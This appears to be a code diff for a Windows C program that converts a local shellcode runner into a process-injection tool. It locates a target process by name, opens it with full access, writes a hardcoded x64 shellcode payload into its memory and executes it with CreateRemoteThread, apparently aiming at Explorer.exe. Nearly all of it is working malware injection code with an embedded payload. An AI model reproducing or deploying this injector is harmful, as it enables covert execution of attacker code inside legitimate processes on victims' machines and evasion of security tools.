@@ -1,8 +1,40 @@
 #include <stdio.h>
 #include <windows.h>
+#include <TlHelp32.h>
 
-int main(void)
+int main(int argc, char** argv)
 {
+    if (argc != 2)
+    {
+        printf("[-] Put a One Parameter Plz! like:process.exe %lu\n", GetLastError());
+    }
+
+
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    DWORD pid;
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (Process32First(snapshot, &entry) == TRUE)
+    {
+        while (Process32Next(snapshot, &entry) == TRUE)
+        {
+            if (stricmp(entry.szExeFile, argv[1]) == 0)
+            {
+                pid = entry.th32ProcessID;
+            }
+        }
+    }
+
+    HANDLE hExplorer = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    
+    if (hExplorer == NULL)
+    {
+        printf("[-] Error to Open Process: Explorer.exe %lu\n", GetLastError());
+        return 1;
+    }
+
     unsigned char shellCode[] = {
         "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
         "\x51\x41\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48"
@@ -28,21 +60,28 @@ int main(void)
         "\x65\x72\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56\x07"
         "\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5"};
 
-    LPVOID hHandler = VirtualAlloc(NULL, sizeof(shellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID lpRemoteMemory = VirtualAllocEx(hExplorer, NULL, sizeof(shellCode), MEM_COMMIT | MEM_RESERVE , PAGE_EXECUTE_READWRITE);
 
-    if (!hHandler) {
-        printf("[-] VirtualAlloc failed: " + GetLastError());
-        return -1;
+    BOOL opk = WriteProcessMemory(hExplorer, lpRemoteMemory, shellCode, sizeof(shellCode), NULL);
+
+    if (!opk)
+    {
+        printf("[-] Error to Write in Process %lu\n", GetLastError());
+        return 1;
     }
 
-    memcpy(hHandler, shellCode, sizeof(shellCode));
+    HANDLE hThread = CreateRemoteThread(hExplorer, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteMemory, NULL, 0, NULL);
 
-    DWORD oldProtect;
+    if (!hThread)
+    {
+        printf("[-] Error to create remote Thread %lu\n", GetLastError());
+        return 1;
+    }
 
-    BOOL bVirtual = VirtualProtect(hHandler, sizeof(shellCode), PAGE_EXECUTE_READWRITE, &oldProtect);
+    printf("[+] Remote thread created successfully!\n");
 
-    void (*func)() = (void(*)())hHandler;
-    func();
+    CloseHandle(hThread);
+    CloseHandle(hExplorer);
 
     return 0;
 }
